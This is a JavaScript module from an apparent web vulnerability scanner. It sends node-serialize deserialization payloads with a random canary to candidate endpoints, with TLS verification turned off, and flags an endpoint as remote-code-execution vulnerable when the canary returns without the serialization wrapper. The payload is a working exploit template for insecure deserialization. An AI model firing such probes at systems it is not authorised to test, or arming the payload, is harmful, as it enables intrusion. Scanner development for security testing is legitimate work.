const { BaseModule, ModuleResult } = require('./base');
const { pushInsecureTLS, popInsecureTLS } = require('../tls_guard');
const { endpointCandidates } = require('./massassign_confirm');

// POST a node-serialize style payload carrying a unique canary. A vulnerable
// deserializer "executes" the embedded function and returns just the canary;
// an endpoint that merely echoes the body returns the _$$ND_FUNC$$_ wrapper too,
// so we require the canary WITHOUT the wrapper to avoid echo false positives.
class DeserConfirm extends BaseModule {
  static moduleName = 'deser_confirm';
  static phase = 'P6c';
  static toolsNeeded = [];

  async execute() {
    const candidates = endpointCandidates(this.workspace, this.scope, true);
    if (!candidates.length) return new ModuleResult({ module: DeserConfirm.moduleName, status: 'skipped', errors: ['No candidate endpoints'] });
    const ua = this.config.user_agent || 'WebKiller/3.0';
    const confirmed = [];
    pushInsecureTLS();
    try {
      for (const ep of candidates.slice(0, this.config.deser_max_urls || 80)) {
        const token = Math.random().toString(36).slice(2, 10);
        const marker = `WK_DESER_${token}`;
        const payloads = [
          JSON.stringify({ wk: `_$$ND_FUNC$$_function(){return '${marker}'}()` }),
          Buffer.from(JSON.stringify({ wk: `_$$ND_FUNC$$_function(){return '${marker}'}()` })).toString('base64'),
        ];
        let hit = false;
        for (const body of payloads) {
          try {
            const resp = await fetch(ep, { method: 'POST', headers: { 'User-Agent': ua, 'Content-Type': 'application/json' }, body, signal: AbortSignal.timeout(8000) });
            const text = await resp.text();
            // Executed → just the canary comes back; echoed → the _$$ND_FUNC$$_
            // wrapper is still present, which is not exploitation.
            if (text.includes(marker) && !/_\$\$ND_FUNC\$\$_/.test(text)) {
              confirmed.push({ name: 'Insecure deserialization', severity: 'critical', url: ep, evidence: { marker, note: 'serialized payload executed server-side — RCE' }, type: 'dast_confirmed', vuln_class: 'deserialization', module: DeserConfirm.moduleName });
              hit = true; break;
            }
          } catch { /* skip */ }
        }
        if (hit) continue;
      }
    } finally { popInsecureTLS(); }
    const out = dedup(confirmed);
    if (out.length) { this.workspace.appendJsonl('confirmed.jsonl', out); this.workspace.appendJsonl('findings.jsonl', out); }
    return new ModuleResult({ module: DeserConfirm.moduleName, items: out.map(c => c.url), records: out, toolUsed: 'ndserialize-canary' });
  }

  _candidates() {
    const set = new Set();
    for (const u of [...this.workspace.readLines('urls.txt'), ...this.workspace.readLines('live.txt')]) {
      try { const p = new URL(u); set.add(p.origin + p.pathname); } catch { /* skip */ }
    }
    return [...set];
  }
}
function dedup(arr) { const s = new Set(); return arr.filter(c => { if (s.has(c.url)) return false; s.add(c.url); return true; }); }
module.exports = DeserConfirm;
